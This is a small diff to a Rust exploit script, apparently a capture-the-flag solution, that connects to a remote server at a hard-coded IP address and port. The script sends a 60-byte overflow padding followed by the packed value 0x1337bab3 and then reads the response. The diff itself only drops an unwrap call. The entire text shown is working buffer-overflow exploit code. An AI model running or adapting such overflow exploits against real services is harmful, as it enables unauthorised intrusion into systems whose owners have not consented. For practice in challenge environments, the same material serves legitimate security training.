@@ -6,7 +6,7 @@ fn main() -> std::io::Result<()> {
     let mut sock = Remote::new("64.227.39.88", 32621)?;
     sock.clean(None)?;
     let mut buf = b"A".repeat(60);
-    buf.append(&mut p64(0x1337bab3).unwrap());
+    buf.append(&mut p64(0x1337bab3));
     sock.sendline(buf)?;
     sock.recvuntil(b": ")?;
     let result = sock.recvline().unwrap();
